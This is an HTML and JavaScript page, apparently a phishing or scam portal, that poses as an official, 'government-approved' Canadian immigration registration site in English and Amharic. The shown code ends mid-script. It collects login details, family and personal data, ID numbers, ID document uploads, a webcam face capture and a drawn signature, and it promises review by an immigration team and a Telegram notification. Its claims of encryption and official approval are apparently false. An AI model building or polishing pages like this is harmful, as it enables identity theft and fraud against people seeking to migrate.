<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Canada Registration Form</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg') no-repeat center center fixed;
      background-size: cover;
      color: black;
    }
    .overlay {
      background: rgba(0, 0, 0, 0.5);
      padding: 20px;
      min-height: 100vh;
    }
    .container { max-width: 900px; margin: 0 auto; padding: 20px; }
    h1, h2 { color: #2e7d32; }
    button {
      cursor: pointer;
      padding: 10px 20px;
      background: #43a047;
      color: white;
      border: none;
      border-radius: 5px;
      transition: all 0.3s;
    }
    button:hover {
      background: #388e3c;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      transform: scale(1.05);
    }
    .note-block, .login-tips, .trust-banner { 
      background: #e8f5e9; 
      padding: 10px; 
      margin: 10px 0; 
      border-radius: 5px; 
    }
    .emoji { margin-right: 5px; }
    .process-steps { margin-left: 20px; }
    .cta { text-align: center; margin-top: 20px; }
    #loginError { display: none; color: red; margin: 10px 0; }
    form { background: url('https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg') no-repeat center center fixed; }
    label { display: block; margin: 10px 0 5px; font-weight: 600; }
    input, select { 
      width: 100%; 
      padding: 8px; 
      margin-bottom: 10px; 
      border: 1px solid #ccc; 
      border-radius: 4px; 
      box-sizing: border-box; 
    }
    fieldset { 
      border: 1px solid #ddd; 
      padding: 10px; 
      margin-bottom: 30px;
      border-radius: 5px; 
    }
    legend { font-weight: 600; color: #2e7d32; }
    .row { display: flex; gap: 20px; flex-wrap: wrap; }
    .row > div { flex: 1; min-width: 200px; }
    .header-row { 
      display: flex; 
      justify-content: space-between; 
      align-items: center; 
      margin-bottom: 20px; 
    }
    .form-title { font-size: 24px; font-weight: 600; color: #2e7d32; }
    .form-subtitle { font-size: 14px; color: #666; }
    .photo-box { 
      position: relative; 
      width: 100px; 
      height: 100px; 
      border: 2px dashed #ccc; 
      text-align: center; 
    }
    #photoInput { 
      position: absolute; 
      width: 100%; 
      height: 100%; 
      opacity: 0; 
      cursor: pointer; 
    }
    #photoPreview { 
      display: none; 
      width: 100%; 
      height: 100%; 
      object-fit: cover; 
    }
    #photoLabel { 
      position: absolute; 
      top: 50%; 
      left: 50%; 
      transform: translate(-50%, -50%); 
      color: #666; 
    }
    .accompanied-header { 
      display: flex; 
      font-weight: 600; 
      margin-bottom: 10px; 
    }
    .accompanied-header > div { flex: 1; }
    .accompanied-row { display: flex; gap: 20px; margin-bottom: 10px; }
    .accompanied-row input { flex: 1; min-width: 0; }
    .signature-section { 
      display: flex; 
      gap: 20px; 
      flex-wrap: wrap; 
      align-items: flex-start; 
      margin: 20px 0; 
    }
    .signature-box { flex: 1; min-width: 300px; }
    #signature { 
      border: 1px solid #ccc; 
      display: block; 
      margin: 10px 0; 
      background: white; 
    }
    .clear-btn { background: #d32f2f; }
    .clear-btn:hover { background: #c62828; }
    .submit-btn { width: 100%; padding: 15px; font-size: 16px; }
    .note { font-size: 12px; color: #666; margin-bottom: 20px; }
    .disclaimer { 
      font-size: 12px; 
      color: #666; 
      margin-top: 20px; 
      text-align: center; 
    }
    .date-time { 
      text-align: right; 
      font-size: 12px; 
      color: #666; 
      margin-bottom: 10px; 
    }
    /* Face Scan Styles */
    .face-scan-section {
      margin: 20px 0;
      text-align: center;
    }
    #video {
      width: 100%;
      max-width: 400px;
      border: 1px solid #ccc;
      margin-bottom: 10px;
    }
    #captureBtn {
      background: #43a047;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
    }
    #captureBtn:hover {
      background: #388e3c;
    }
    #facePreview {
      display: none;
      width: 100%;
      max-width: 400px;
      margin: 10px auto;
    }
    /* Spinner */
    #spinner {
      display: none;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    /* Language switcher styles */
    .language-switcher { text-align: right; padding: 10px; }
    .language-switcher select { padding: 5px; border-radius: 4px; }
    /* Modal styles */
    #submissionModal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
    }
    .modal-content {
      background: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      position: relative;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      opacity: 0;
      transition: opacity 0.3s;
    }
    #submissionModal.show .modal-content { opacity: 1; }
    .close-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      font-size: 24px;
      cursor: pointer;
    }
    .close-btn:hover { color: red; }
    .checkmark {
      width: 60px;
      height: 30px;
      border-left: 10px solid green;
      border-bottom: 10px solid green;
      transform: rotate(-45deg);
      margin: 20px auto;
      animation: scaleIn 0.5s ease-out forwards;
    }
    @keyframes scaleIn {
      from { transform: scale(0) rotate(-45deg); }
      to { transform: scale(1) rotate(-45deg); }
    }
    .modal-content h2 {
      color: green;
      font-size: 24px;
      margin-bottom: 10px;
    }
    .confetti {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Language Switcher -->
    <div class="language-switcher">
      <label for="languageSelect" data-translate="languageLabel">Language: </label>
      <select id="languageSelect">
        <option value="en" data-translate="englishOption">English</option>
        <option value="am" data-translate="amharicOption">Amharic</option>
      </select>
    </div>

    <!-- Current Date and Time -->
    <div class="date-time" id="dateTime"></div>

    <!-- Intro Page -->
    <div class="intro" id="introPage">
      <h1 data-translate="welcome">Welcome</h1>
      <div class="trust-banner">
        <span class="emoji">ğŸ”’</span> 
        <span data-translate="trustBanner">Secure and Trusted Platform</span>
      </div>
      <div class="note-block">
        <span class="emoji">âœ…</span>
        <span data-translate="officialNote">
          <b>Official & Trusted:</b> This portal is government-approved. Your data is encrypted and never shared without your consent.
        </span>
      </div>
      <p data-translate="processIntro"><b>How the process works:</b></p>
      <ol class="process-steps">
        <li data-translate="step1">Log in using your secure credentials</li>
        <li data-translate="step2">Fill in your personal and family information. Upload a recent photo for identification and an ID</li>
        <li data-translate="step3">Confirm your details and sign electronically.</li>
        <li data-translate="step4">Submit your registration. Your data is reviewed by our trusted Canadian immigration team</li>
        <li data-translate="step5">You will receive a confirmation email and Telegram notification</li>
      </ol>
      <div class="cta">
        <button id="startBtn" data-translate="startButton">Get Started</button>
      </div>
    </div>

    <!-- Login Page -->
    <div id="loginPage" style="display:none;">
      <form id="loginForm" autocomplete="off">
        <h2 data-translate="loginTitle">Login to Continue</h2>
        <div id="loginError" data-translate="loginError">Invalid username or password</div>
        <label for="usernameInput" data-translate="usernameLabel">Username</label>
        <input type="text" id="usernameInput" placeholder="Enter username" required autocomplete="username" data-translate-placeholder="usernamePlaceholder" />
        <label for="passwordInput" data-translate="passwordLabel">Password</label>
        <input type="password" id="passwordInput" placeholder="Enter password" required autocomplete="current-password" data-translate-placeholder="passwordPlaceholder" />
        <button type="submit" data-translate="loginButton">Login</button>
        <div class="login-tips">
          <span class="emoji">ğŸ”‘</span>
          <span data-translate="loginHelp">Need help? Contact our <a href="mailto:support@canada.ca" style="color:#43a047;text-decoration:underline;">support team</a>.</span>
        </div>
      </form>
    </div>

    <!-- Form Page -->
    <div id="formPage" style="display:none;">
      <div id="spinner"></div> <!-- Spinner for submission -->
      <div class="header-row">
        <div>
          <div class="form-title" data-translate="formTitle">Canada Registration Form</div>
          <div class="form-subtitle" data-translate="formSubtitle">Department of Citizenship & Immigration</div>
        </div>
        <div class="photo-box" id="photoBox">
          <input type="file" name="photo" id="photoInput" accept="image/*" required>
          <img id="photoPreview" alt="Photo Preview">
          <span id="photoLabel" data-translate="photoLabel">PHOTO</span>
        </div>
      </div>
      <p class="note" data-translate="photoNote">Please upload a recent passport-style photo (JPG, PNG, max 2MB)</p>
      <form id="canadaRegForm" autocomplete="off">
        <fieldset>
          <legend data-translate="personalInfoLegend">PERSONAL INFORMATION</legend>
          <div class="row">
            <div>
              <label data-translate="fullNameLabel">Full Name</label>
              <input type="text" name="fullName" required data-translate-placeholder="fullNamePlaceholder">
            </div>
            <div>
              <label data-translate="fatherNameLabel">Father's Name</label>
              <input type="text" name="fatherName" data-translate-placeholder="fatherNamePlaceholder">
            </div>
            <div>
              <label data-translate="motherNameLabel">Mother's Name</label>
              <input type="text" name="motherName" data-translate-placeholder="motherNamePlaceholder">
            </div>
          </div>
          <div class="row">
            <div>
              <label data-translate="genderLabel">Gender</label>
              <select name="gender" required>
                <option value="" data-translate="selectOption">Select...</option>
                <option data-translate="maleOption">Male</option>
                <option data-translate="femaleOption">Female</option>
                <option data-translate="otherOption">Other</option>
              </select>
            </div>
            <div>
              <label data-translate="dobLabel">Date of Birth</label>
              <input type="date" name="dob">
            </div>
            <div>
              <label data-translate="nationalityLabel">Nationality</label>
              <input type="text" name="nationality" data-translate-placeholder="nationalityPlaceholder">
            </div>
          </div>
          <div class="row">
            <div>
              <label data-translate="birthPlaceLabel">Place of Birth</label>
              <input type="text" name="birthPlace" data-translate-placeholder="birthPlacePlaceholder">
            </div>
            <div>
              <label data-translate="idNumberLabel">Identification Number</label>
              <input type="text" name="idNumber" data-translate-placeholder="idNumberPlaceholder">
            </div>
          </div>
        </fieldset>
        <fieldset>
          <legend data-translate="accompaniedLegend">ACCOMPANIED BY (If applicable)</legend>
          <div class="accompanied-header">
            <div data-translate="nameHeader">Name</div>
            <div data-translate="relationshipHeader">Relationship</div>
          </div>
          <div class="accompanied-row">
            <input type="text" name="accompaniedName1" data-translate-placeholder="namePlaceholder">
            <input type="text" name="accompaniedRel1" data-translate-placeholder="relationshipPlaceholder">
          </div>
          <div class="accompanied-row">
            <input type="text" name="accompaniedName2" data-translate-placeholder="namePlaceholder">
            <input type="text" name="accompaniedRel2" data-translate-placeholder="relationshipPlaceholder">
          </div>
          <div class="accompanied-row">
            <input type="text" name="accompaniedName3" data-translate-placeholder="namePlaceholder">
            <input type="text" name="accompaniedRel3" data-translate-placeholder="relationshipPlaceholder">
          </div>
        </fieldset>
        <fieldset>
          <legend data-translate="contactLegend">CONTACT & ADDRESS</legend>
          <input type="text" name="address" placeholder="Permanent Address" style="margin-bottom:10px;" data-translate-placeholder="addressPlaceholder">
          <div class="row">
            <div>
              <label data-translate="phoneLabel">Phone Number</label>
              <input type="tel" name="phone" data-translate-placeholder="phonePlaceholder">
            </div>
            <div>
              <label data-translate="emailLabel">Email</label>
              <input type="email" name="email" data-translate-placeholder="emailPlaceholder">
            </div>
          </div>
        </fieldset>
        <fieldset>
          <legend data-translate="idUploadLegend">UPLOAD IDENTIFICATION</legend>
          <div>
            <label data-translate="idUploadLabel">Upload ID (passport, national ID, etc.)</label>
            <input type="file" name="idUpload" id="idUpload" accept="image/*,.pdf" required>
          </div>
          <p class="note" data-translate="idNote">Accepted IDs: passport, national ID, driver's license (JPG, PNG, PDF, max 5MB)</p>
        </fieldset>
        <!-- Face Scan Section -->
        <fieldset>
          <legend data-translate="faceScanLegend">LIVE FACE SCAN</legend>
          <div class="face-scan-section">
            <video id="video" autoplay></video>
            <button type="button" id="captureBtn" data-translate="captureButton">Capture Face</button>
            <img id="facePreview" alt="Face Preview">
          </div>
          <p class="note" data-translate="faceScanNote">Please position your face within the frame and click "Capture Face".</p>
        </fieldset>
        <div class="signature-section">
          <div>
            <label data-translate="dateLabel">Date</label>
            <input type="date" name="applicationDate" style="width:160px;">
          </div>
          <div class="signature-box">
            <label style="font-weight:600;" data-translate="signatureLabel">Signature of Applicant</label>
            <p class="note" data-translate="signatureNote">Please sign within the box using your mouse or touch screen.</p>
            <canvas id="signature" width="350" height="80"></canvas>
            <button type="button" class="clear-btn" id="clearSignatureBtn" data-translate="clearSignatureButton">Clear Signature</button>
          </div>
        </div>
        <p class="note" data-translate="submissionNote">Note: Your uploaded photo, ID, and signature will be sent directly to the Canadian immigration team for review. You will not receive copies of these files.</p>
        <button type="submit" class="submit-btn" data-translate="submitButton">Submit Registration</button>
        <p class="disclaimer" data-translate="disclaimer">Your data is protected under the Canadian Privacy Act. <a href="#">Learn more</a></p>
      </form>
    </div>

    <!-- Submission Modal -->
    <div id="submissionModal">
      <div class="modal-content">
        <span class="close-btn" id="closeModal">Ã—</span>
        <h2 data-translate="successHeading">Success!</h2>
        <div class="checkmark"></div>
        <p id="submissionMessage" data-translate="submissionSuccess">Registration submitted successfully! Your uploaded photo, ID, and signature have been sent to our immigration team for review. You will be contacted soon.</p>
        <div class="confetti" id="confetti"></div>
      </div>
    </div>
  </div>

  <script>
    // Translations object
    const translations = {
      en: {
        languageLabel: "Language: ",
        englishOption: "English",
        amharicOption: "Amharic",
        welcome: "Welcome",
        trustBanner: "Secure and Trusted Platform",
        officialNote: "<b>Official & Trusted:</b> This portal is government-approved. Your data is encrypted and never shared without your consent.",
        processIntro: "<b>How the process works:</b>",
        step1: "Log in using your secure credentials",
        step2: "Fill in your personal and family information. Upload a recent photo for identification and an ID",
        step3: "Confirm your details and sign electronically.",
        step4: "Submit your registration. Your data is reviewed by our trusted Canadian immigration team",
        step5: "You will receive a confirmation email and Telegram notification",
        startButton: "Get Started",
        loginTitle: "Login to Continue",
        loginError: "Invalid username or password",
        usernameLabel: "Username",
        usernamePlaceholder: "Enter username",
        passwordLabel: "Password",
        passwordPlaceholder: "Enter password",
        loginButton: "Login",
        loginHelp: "Need help? Contact our <a href='mailto:support@canada.ca' style='color:#43a047;text-decoration:underline;'>support team</a>.",
        formTitle: "Canada Registration Form",
        formSubtitle: "Department of Citizenship & Immigration",
        photoLabel: "PHOTO",
        photoNote: "Please upload a recent passport-style photo (JPG, PNG, max 2MB)",
        personalInfoLegend: "PERSONAL INFORMATION",
        fullNameLabel: "Full Name",
        fullNamePlaceholder: "Enter full name",
        fatherNameLabel: "Father's Name",
        fatherNamePlaceholder: "Enter father's name",
        motherNameLabel: "Mother's Name",
        motherNamePlaceholder: "Enter mother's name",
        genderLabel: "Gender",
        selectOption: "Select...",
        maleOption: "Male",
        femaleOption: "Female",
        otherOption: "Other",
        dobLabel: "Date of Birth",
        nationalityLabel: "Nationality",
        nationalityPlaceholder: "Enter nationality",
        birthPlaceLabel: "Place of Birth",
        birthPlacePlaceholder: "Enter place of birth",
        idNumberLabel: "Identification Number",
        idNumberPlaceholder: "Enter ID number",
        accompaniedLegend: "ACCOMPANIED BY (If applicable)",
        nameHeader: "Name",
        relationshipHeader: "Relationship",
        namePlaceholder: "Name",
        relationshipPlaceholder: "Relationship",
        contactLegend: "CONTACT & ADDRESS",
        addressPlaceholder: "Permanent Address",
        phoneLabel: "Phone Number",
        phonePlaceholder: "Enter phone number",
        emailLabel: "Email",
        emailPlaceholder: "Enter email",
        idUploadLegend: "UPLOAD IDENTIFICATION",
        idUploadLabel: "Upload ID (passport, national ID, etc.)",
        idNote: "Accepted IDs: passport, national ID, driver's license (JPG, PNG, PDF, max 5MB)",
        faceScanLegend: "LIVE FACE SCAN",
        captureButton: "Capture Face",
        faceScanNote: "Please position your face within the frame and click \"Capture Face\".",
        dateLabel: "Date",
        signatureLabel: "Signature of Applicant",
        signatureNote: "Please sign within the box using your mouse or touch screen.",
        clearSignatureButton: "Clear Signature",
        submissionNote: "Note: Your uploaded photo, ID, and signature will be sent directly to the Canadian immigration team for review. You will not receive copies of these files.",
        submitButton: "Submit Registration",
        disclaimer: "Your data is protected under the Canadian Privacy Act. <a href='#'>Learn more</a>",
        successHeading: "Success!",
        submissionSuccess: "Registration submitted successfully! Your uploaded photo, ID, and signature have been sent to our immigration team for review. You will be contacted soon."
      },
      am: {
        languageLabel: "á‰‹áŠ•á‰‹: ",
        englishOption: "áŠ¥áŠ•áŒáˆŠá‹áŠ›",
        amharicOption: "áŠ áˆ›áˆ­áŠ›",
        welcome: "áŠ¥áŠ•áŠ³áŠ• á‹°áˆ…áŠ“ áˆ˜áŒ¡",
        trustBanner: "á‹°áˆ…áŠ•áŠá‰± á‹¨á‰°áŒ á‰ á‰€ áŠ¥áŠ“ á‹¨á‰³áˆ˜áŠ áˆ˜á‹µáˆ¨áŠ­",
        officialNote: "<b>áŠ¦áŠáˆ´áˆ‹á‹Š áŠ¥áŠ“ á‹¨á‰³áˆ˜áŠ:</b> á‹­áˆ… á–áˆ­á‰³áˆ á‰ áˆ˜áŠ•áŒáˆµá‰µ á‹¨á‰°áˆá‰€á‹° áŠá‹á¢ á‹¨áŠ¥áˆ­áˆµá‹ á‹áˆ‚á‰¥ á‰°áˆ˜áˆµáŒ¥áˆ® á‹¨á‰°áŒ á‰ á‰€ áŠ¥áŠ“ á‹«áˆˆ áŠ¥áˆ­áˆµá‹ áˆá‰ƒá‹µ áŠ á‹­áŒ‹áˆ«áˆá¢",
        processIntro: "<b>á‹¨áˆ‚á‹°á‰± áˆ‚á‹°á‰µ:</b>",
        step1: "á‹°áˆ…áŠ•áŠá‰± á‹¨á‰°áŒ á‰ á‰€ áˆáˆµáŠ­áˆ­áŠá‰¶á‰½áŠ• á‰ áˆ˜áŒ á‰€áˆ á‹­áŒá‰¡",
        step2: "á‹¨áŒáˆ áŠ¥áŠ“ á‹¨á‰¤á‰°áˆ°á‰¥ áˆ˜áˆ¨áŒƒá‹áŠ• á‹­áˆ™áˆ‰á¢ áˆˆáˆ˜áˆˆá‹¨á‰µ á‹¨á‰…áˆ­á‰¥ áŒŠá‹œ áá‰¶ áŠ¥áŠ“ áˆ˜á‰³á‹ˆá‰‚á‹« á‹­áˆµá‰€áˆ‰",
        step3: "á‹áˆ­á‹áˆ®á‰½á‹áŠ• á‹«áˆ¨áŒ‹áŒáŒ¡ áŠ¥áŠ“ á‰ áŠ¤áˆŒáŠ­á‰µáˆ®áŠ’áŠ­ á‹­áˆáˆ­áˆ™á¢",
        step4: "áˆá‹áŒˆá‰£á‹áŠ• á‹«áˆµáŒˆá‰¡á¢ á‹¨áŠ¥áˆ­áˆµá‹ á‹áˆ‚á‰¥ á‰ á‰³áˆ˜áŠá‹ á‹¨áŠ«áŠ“á‹³ áŠ¢áˆšáŒáˆ¬áˆ½áŠ• á‰¡á‹µáŠ• á‹­áŒˆáˆ˜áŒˆáˆ›áˆ",
        step5: "á‹¨áˆ›áˆ¨áŒ‹áŒˆáŒ« áŠ¢áˆœá‹­áˆ áŠ¥áŠ“ á‹¨á‰´áˆŒáŒáˆ«áˆ áˆ›áˆ³á‹ˆá‰‚á‹« á‹­á‹°áˆ­áˆµá‹á‰³áˆ",
        startButton: "áŒ€áˆáˆ­",
        loginTitle: "á‹­áŒá‰¡ áˆˆáˆ˜á‰€áŒ áˆ",
        loginError: "á‹¨á‰°áˆ³áˆ³á‰° á‹¨á‰°áŒ á‰ƒáˆš áˆµáˆ á‹ˆá‹­áˆ á‹¨á‹­áˆˆá á‰ƒáˆ",
        usernameLabel: "á‹¨á‰°áŒ á‰ƒáˆš áˆµáˆ",
        usernamePlaceholder: "á‹¨á‰°áŒ á‰ƒáˆš áˆµáˆ á‹«áˆµáŒˆá‰¡",
        passwordLabel: "á‹¨á‹­áˆˆá á‰ƒáˆ",
        passwordPlaceholder: "á‹¨á‹­áˆˆá á‰ƒáˆ á‹«áˆµáŒˆá‰¡",
        loginButton: "áŒá‰£",
        loginHelp: "áŠ¥áŒˆá‹› á‹­áˆáˆáŒ‹áˆ‰? á‹¨áŠ¥áŠ›áŠ• <a href='mailto:support@canada.ca' style='color:#43a047;text-decoration:underline;'>á‹¨á‹µáŒ‹á á‰¡á‹µáŠ•</a> á‹«áŠáŒ‹áŒáˆ©á¢",
        formTitle: "á‹¨áŠ«áŠ“á‹³ áˆá‹áŒˆá‰£ á‰…áŒ½",
        formSubtitle: "á‹¨á‹œáŒáŠá‰µ áŠ¥áŠ“ áŠ¢áˆšáŒáˆ¬áˆ½áŠ• áˆ˜áˆáˆªá‹«",
        photoLabel: "áá‰¶",
        photoNote: "áŠ¥á‰£áŠ­á‹ á‹¨á‰…áˆ­á‰¥ áŒŠá‹œ á‹¨á“áˆµá–áˆ­á‰µ á‹˜á‹­á‰¤ áá‰¶ á‹­áˆµá‰€áˆ‰ (JPGá£ PNGá£ áŠ¨áá‰°áŠ› 2MB)",
        personalInfoLegend: "á‹¨áŒáˆ áˆ˜áˆ¨áŒƒ",
        fullNameLabel: "áˆ™áˆ‰ áˆµáˆ",
        fullNamePlaceholder: "áˆ™áˆ‰ áˆµáˆ á‹«áˆµáŒˆá‰¡",
        fatherNameLabel: "á‹¨áŠ á‰£á‰µ áˆµáˆ",
        fatherNamePlaceholder: "á‹¨áŠ á‰£á‰µ áˆµáˆ á‹«áˆµáŒˆá‰¡",
        motherNameLabel: "á‹¨áŠ¥áŠ“á‰µ áˆµáˆ",
        motherNamePlaceholder: "á‹¨áŠ¥áŠ“á‰µ áˆµáˆ á‹«áˆµáŒˆá‰¡",
        genderLabel: "áŒ¾á‰³",
        selectOption: "á‹­áˆáˆ¨áŒ¡...",
        maleOption: "á‹ˆáŠ•á‹µ",
        femaleOption: "áˆ´á‰µ",
        otherOption: "áˆŒáˆ‹",
        dobLabel: "á‹¨á‰µá‹áˆá‹µ á‰€áŠ•",
        nationalityLabel: "á‹œáŒáŠá‰µ",
        nationalityPlaceholder: "á‹œáŒáŠá‰µ á‹«áˆµáŒˆá‰¡",
        birthPlaceLabel: "á‹¨á‰µá‹áˆá‹µ á‰¦á‰³",
        birthPlacePlaceholder: "á‹¨á‰µá‹áˆá‹µ á‰¦á‰³ á‹«áˆµáŒˆá‰¡",
        idNumberLabel: "á‹¨áˆ˜á‰³á‹ˆá‰‚á‹« á‰áŒ¥áˆ­",
        idNumberPlaceholder: "á‹¨áˆ˜á‰³á‹ˆá‰‚á‹« á‰áŒ¥áˆ­ á‹«áˆµáŒˆá‰¡",
        accompaniedLegend: "á‰ áŠ á‰¥áˆ®áŠá‰µ (áŠ¨á‰°áˆá‰€á‹°)",
        nameHeader: "áˆµáˆ",
        relationshipHeader: "á‹áˆá‹µáŠ“",
        namePlaceholder: "áˆµáˆ",
        relationshipPlaceholder: "á‹áˆá‹µáŠ“",
        contactLegend: "á‹¨áŠ¥á‹á‰‚á‹« áŠ¥áŠ“ áŠ á‹µáˆ«áˆ»",
        addressPlaceholder: "á‰‹áˆš áŠ á‹µáˆ«áˆ»",
        phoneLabel: "áˆµáˆáŠ­ á‰áŒ¥áˆ­",
        phonePlaceholder: "áˆµáˆáŠ­ á‰áŒ¥áˆ­ á‹«áˆµáŒˆá‰¡",
        emailLabel: "áŠ¢áˆœá‹­áˆ",
        emailPlaceholder: "áŠ¢áˆœá‹­áˆ á‹«áˆµáŒˆá‰¡",
        idUploadLegend: "áˆ˜á‰³á‹ˆá‰‚á‹« áˆµá‰€áˆ",
        idUploadLabel: "áˆ˜á‰³á‹ˆá‰‚á‹« áˆµá‰€áˆ (á“áˆµá–áˆ­á‰µá£ á‰¥áˆ„áˆ«á‹Š áˆ˜á‰³á‹ˆá‰‚á‹«á£ á‹ˆá‹˜á‰°)",
        idNote: "á‰°á‰€á‰£á‹­áŠá‰µ á‹«áˆ‹á‰¸á‹ áˆ˜á‰³á‹ˆá‰‚á‹«á‹á‰½: á“áˆµá–áˆ­á‰µá£ á‰¥áˆ„áˆ«á‹Š áˆ˜á‰³á‹ˆá‰‚á‹«á£ á‹¨áˆ˜áŠ•áŒƒ áˆá‰ƒá‹µ (JPGá£ PNGá£ PDFá£ áŠ¨áá‰°áŠ› 5MB)",
        faceScanLegend: "á‹¨áŠá‰µ á‰…áŠá‰µ",
        captureButton: "áŠá‰µ á‹«áŠ•áˆ±",
        faceScanNote: "áŠ¥á‰£áŠ­á‹ áŠá‰µá‹áŠ• á‰ ááˆ¬áˆ™ á‹áˆµáŒ¥ á‹«áˆµá‰€áˆáŒ¡ áŠ¥áŠ“ \"áŠá‰µ á‹«áŠ•áˆ±\" á‹¨áˆšáˆˆá‹áŠ• á‹­áŒ«áŠ‘á¢",
        dateLabel: "á‰€áŠ•",
        signatureLabel: "á‹¨áŠ áˆ˜áˆáŠ«á‰½ áŠáˆ­áˆ›",
        signatureNote: "áŠ¥á‰£áŠ­á‹ á‰ áŠ á‹­áŒ¥ á‹ˆá‹­áˆ á‰ áŠ•áŠ­áŠª áˆµáŠ­áˆªáŠ• á‰ áˆ˜áŒ á‰€áˆ á‰ áˆ³áŒ¥áŠ‘ á‹áˆµáŒ¥ á‹­áˆáˆ­áˆ™á¢",
        clearSignatureButton: "áŠáˆ­áˆ› áŠ áŒ½á‹³",
        submissionNote: "áˆ›áˆµá‰³á‹ˆáˆ»: á‹¨á‰°áˆ°á‰€áˆˆá‹ áá‰¶á£ áˆ˜á‰³á‹ˆá‰‚á‹« áŠ¥áŠ“ áŠáˆ­áˆ› á‰ á‰€áŒ¥á‰³ áˆˆáŠ«áŠ“á‹³ áŠ¢áˆšáŒáˆ¬áˆ½áŠ• á‰¡á‹µáŠ• áˆˆáŒáˆáŒˆáˆ› á‹­áˆ‹áŠ«áˆá¢ á‹¨áŠ¥áŠá‹šáˆ… á‹á‹­áˆá‰½ á‰…áŒ‚á‹á‰½ áŠ á‹­á‰€á‰ áˆ‰áˆá¢",
        submitButton: "áˆá‹áŒˆá‰£ áŠ áˆµáŒˆá‰£",
        disclaimer: "á‹¨áŠ¥áˆ­áˆµá‹ á‹áˆ‚á‰¥ á‰ áŠ«áŠ“á‹³ á‹¨áŒáˆ‹á‹ŠáŠá‰µ áˆ…áŒ á‹¨á‰°áŒ á‰ á‰€ áŠá‹á¢ <a href='#'>á‰°áŒ¨áˆ›áˆª á‹­á‹ˆá‰</a>",
        successHeading: "á‰°áˆ³áŠ­á‰·áˆ!",
        submissionSuccess: "á‹¨á‰°áˆ³áŠ« áˆá‹áŒˆá‰£! á‹¨á‰°áˆ°á‰€áˆˆá‹ áá‰¶á£ áˆ˜á‰³á‹ˆá‰‚á‹« áŠ¥áŠ“ áŠáˆ­áˆ› áˆˆáŠ¢áˆšáŒáˆ¬áˆ½áŠ• á‰¡á‹µáŠ“á‰½áŠ• áˆˆáŒáˆáŒˆáˆ› á‰°áˆáŠ³áˆá¢ á‰ á‰…áˆ­á‰¡ á‹­áŒˆáŠ“áŠ›áˆ‰á¢"
      }
    };

    let currentLang = 'en'; // Default to English

    // Function to update text based on selected language
    function setLanguage(lang) {
      document.querySelectorAll('[data-translate]').forEach(element => {
        const key = element.getAttribute('data-translate');
        if (translations[lang][key]) {
          element.innerHTML = translations[lang][key];
        }
      });
      document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
        const key = element.getAttribute('data-translate-placeholder');
        if (translations[lang][key]) {
          element.placeholder = translations[lang][key];
        }
      });
      document.querySelectorAll('option[data-translate]').forEach(option => {
        const key = option.getAttribute('data-translate');
        if (translations[lang][key]) {
          option.textContent = translations[lang][key];
        }
      });
    }

    // Set initial language
    setLanguage('en');

    // Language switcher event listener
    document.getElementById('languageSelect').addEventListener('change', function() {
      currentLang = this.value;
      setLanguage(currentLang);
    });

    // Update current date and time
    function updateDateTime() {
      const now = new Date();
      const options = { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        timeZone: 'Africa/Nairobi' 
      };
      document.getElementById('dateTime').textContent = now.toLocaleString('en-US', options);
    }
    updateDateTime();
    setInterval(updateDateTime, 60000); // Update every minute

    // Page navigation
    const introPage = document.getElementById('introPage');
    const loginPage = document.getElementById('loginPage');
    const formPage = document.getElementById('formPage');
    const startBtn = document.getElementById('startBtn');
    const loginForm = document.getElementById('loginForm');
    const regForm = document.getElementById('canadaRegForm');
    const photoInput = document.getElementById('photoInput');
    const photoPreview = document.getElementById('photoPreview');
    const photoLabel = document.getElementById('photoLabel');
    const canvas = document.getElementById('signature');
    const ctx = canvas.getContext('2d');
    const clearSignatureBtn = document.getElementById('clearSignatureBtn');
    const video = document.getElementById('video');
    const captureBtn = document.getElementById('captureBtn');
    const facePreview = document.getElementById('facePreview');
    let stream;

    startBtn.onclick = () => {
      introPage.style.display = 'none';
      loginPage.style.display = 'block';
    };

    // Login functionality (sample credentials: username: "user123", password: "pass123")
    loginForm.onsubmit = (e) => {
      e.preventDefault();
      const username = document.getElementById('usernameInput').value;
      const password = document.getElementById('passwordInput').value;
      if (username === 'user123' && password === 'pass123') {
        loginPage.style.display = 'none';
        formPage.style.display = 'block';
        document.querySelector('input[name="applicationDate"]').value = new Date().toISOString().split('T')[0];
        startVideo(); // Start webcam when form is shown
      } else {
        document.getElementById('loginError').style.display = 'block';
      }
    };

    // Start video for face scan
    async function startVideo() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (error) {
        console.error('Error accessing webcam:', error);
        alert('Could not access webcam. Please ensure you have granted permission.');
      }
    }

    // Capture face photo
    captureBtn.onclick = () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      facePreview.src = canvas.toDataURL('image/png');
      facePreview.style.display = 'block';
      stream.getTracks().forEach(track => track.stop()); // Stop video stream
    };

    // Photo preview
    photoInput.onchange = function() {
      const file = this.files[0];
      if (file) {
        photoPreview.src = URL.createObjectURL(file);
        photoPreview.style.display = 'block';
        photoLabel.style.display = 'none';
      }
    };

    // Signature canvas
    let drawing = false;
    ctx.lineWidth = 2;
    ctx.lineCap = 'round';
    ctx.strokeStyle = '#000';

    function startDrawing(e) {
